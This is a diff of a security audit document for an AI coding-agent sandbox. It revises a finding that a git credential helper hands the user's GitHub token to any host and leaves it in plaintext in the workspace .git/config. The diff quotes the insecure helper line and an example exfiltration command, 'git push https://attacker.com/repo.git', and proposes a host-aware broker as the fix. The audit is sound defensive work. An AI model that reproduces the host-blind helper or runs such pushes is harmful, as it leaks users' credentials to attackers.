@@ -76,9 +76,10 @@ doesn't weaken it:
   (`app-di.ts:136`). The agent cannot corrupt them from inside — this already realizes
   the article's "no-delete for must-preserve data" principle, by construction. Keep it
   that way (see Gap 6 for the inverse risk on the data that *is* mounted).
-- **GitHub token is not written to disk in the container** — it's brokered by a git
-  credential helper rather than embedded in `.gitconfig` (`session-credentials.ts:49-59`).
-  (But see Gap 2 — the helper itself is the leak.)
+- The **shared** `/credentials/.gitconfig` does not embed the GitHub token — it points at
+  the brokered `shipit-git-credential` helper (`session-credentials.ts:49-59`). Note this
+  is *only* true of the shared gitconfig; the per-workspace `.git/config` is a separate
+  story — see Gap 2, which is worse than originally written.
 
 ## Gaps (audit findings — prioritized)
 
@@ -109,24 +110,38 @@ So the mitigation is two-layered:
   request carries *this user's* session token, not an attacker-supplied one, so an
   allowlisted API can't be used to upload into someone else's account.
 
-### Gap 2 — Git credential helper echoes the token to *any* host *(highest priority)*
+### Gap 2 — GitHub token is host-blind *and* sits in plaintext in the workspace `.git/config` *(highest priority)*
 
-`github-auth.ts:225` installs:
+**Empirically verified in a live session**, two compounding problems:
 
-```
-git config credential.helper '!f() { echo "password=${token}"; echo "username=x-access-token"; }; f'
-```
+1. **Host-blind helper.** `configureWorkspaceRepo` (`github-auth.ts:219-227`) writes an
+   inline helper into the *workspace repo's local* `.git/config`:
 
-The helper ignores the `host=` git feeds it on stdin and echoes the real GitHub token
-**unconditionally**. So `git push https://attacker.com/repo.git` (or any HTTPS git URL)
-receives the user's GitHub token as the basic-auth password. This is a concrete
-instance of the article's "approved credential becomes an exfil surface" finding, and it
-exfiltrates the token even *with* a generic egress allowlist if the attacker host is
+   ```
+   git config credential.helper '!f() { echo "password=${token}"; echo "username=x-access-token"; }; f'
+   ```
+
+   The helper ignores the `host=` git feeds it on stdin and echoes the token
+   **unconditionally**. Verified: `git credential fill` for `attacker.example.com`
+   returns the *same* token (identical sha256) as for `github.com`. So
+   `git push https://attacker.com/repo.git` hands the token to an arbitrary remote.
+
+2. **Plaintext on disk.** Because that helper is inline, the literal `ghp_…` token lives
+   in plaintext in `/workspace/.git/config` — readable with a plain file read, no git
+   invocation needed. This **contradicts** the common assumption (and an earlier draft of
+   this doc) that "the token is never written to disk." That assumption holds only for the
+   *shared* `/credentials/.gitconfig`, which uses the broker; the per-workspace config
+   does not.
+
+This is a concrete instance of the article's "approved credential becomes an exfil
+surface," and it leaks even *with* a generic egress allowlist if the attacker host is
 reachable.
 
-**Mitigation:** make the helper host-aware — read the `host=` line from stdin and emit
-credentials **only** for the configured GitHub host(s), echoing nothing otherwise. Cheap,
-self-contained, high-value; can ship independently of the broader egress work.
+**Mitigation:** stop writing the inline token helper into the workspace `.git/config`;
+route the workspace through the same brokered `shipit-git-credential` helper used by the
+shared gitconfig, and make that broker **host-aware** — read `host=` from stdin and emit
+credentials only for the configured GitHub host(s), echoing nothing otherwise. Cheap,
+self-contained, high-value; ships independently of the broader egress work.
 
 ### Gap 3 — No trust boundary before repo-controlled code runs
 
